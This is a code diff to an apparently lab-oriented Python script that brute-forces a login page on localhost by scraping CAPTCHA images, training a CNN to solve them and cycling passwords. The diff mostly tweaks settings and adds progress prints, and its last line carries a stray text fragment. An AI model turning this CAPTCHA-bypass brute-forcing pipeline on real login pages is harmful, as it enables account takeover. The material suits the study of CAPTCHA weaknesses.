@@ -26,7 +26,7 @@ import cv2
 from io import BytesIO
 from urllib.request import urlopen
 
-CAPTCHA_TYPE = 2
+CAPTCHA_TYPE = 0
 
 class BruteForceCracker:
     def __init__(self, url, username, error_message_password, trained_model):
@@ -40,7 +40,7 @@ class BruteForceCracker:
             sys.stdout.flush()
             time.sleep(0.02)
 
-    def crack(self, password, num_iter=10):
+    def crack(self, password, num_iter=2):
         for i in range(num_iter) : 
             print("--------- {} captcha try -------------".format(i+1))
             current_captcha = retrieve_captcha_images(self.url, number_iter=1)
@@ -103,7 +103,7 @@ def retrieve_captcha_images(url, number_iter=300) :
         else:
             print("Failed to retrieve data. Status code : ", response.status_code)
     stock_image = []
-    print(img_url)
+    # print(img_url)
     for i in range (len(img_url)):
         img_url[i] = "http://localhost:3006" + img_url[i]
         response = requests.get(img_url[i], stream = True)
@@ -131,13 +131,21 @@ def main():
     if CAPTCHA_TYPE == 0 :
         url = "http://localhost:3006/auth/login"
         ###################### MNIST Captcha #########################
+        print("starting attack pipeline")
         captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login", number_iter=300)
+        print("retrieve images ok")
         tfds_captcha_images = convert_to_tfds(captcha_images)
+        print("convert images ok")
         predictions = label_mnist(tfds_captcha_images)
+        print("label images ok")
         attacker_dataset = convert_to_tfds(captcha_images, predictions)
+        print("attacker dataset ok")
         attacker_model = attacker_cnn_mnist.create_model()
+        print("attacker model ok")
         trained_model = attacker_cnn_mnist.train(attacker_model, attacker_dataset, epochs=5)
+        print("training model ok")
         cracker = BruteForceCracker(url, username, error, trained_model)
+        print("cracking ok")
         ###############################################################
     elif CAPTCHA_TYPE == 1 : 
         url = "http://localhost:3006/auth/login?captchaType=EMNIST"
@@ -170,4 +178,4 @@ if __name__ == '__main__':
     #retrieve_captcha_images("http://localhost:3006/auth/login", 1)
     main()
     #retrieve_captcha_images("http://localhost:3006/auth/login?captchaType=Python", number_iter=3)
-    #fetch_captcha("http://localhost:3006/auth/login?captchaType=Python")
+    #fetch_captcha("http://localhost:3006/auth/login?captchaType=Python")t images ok
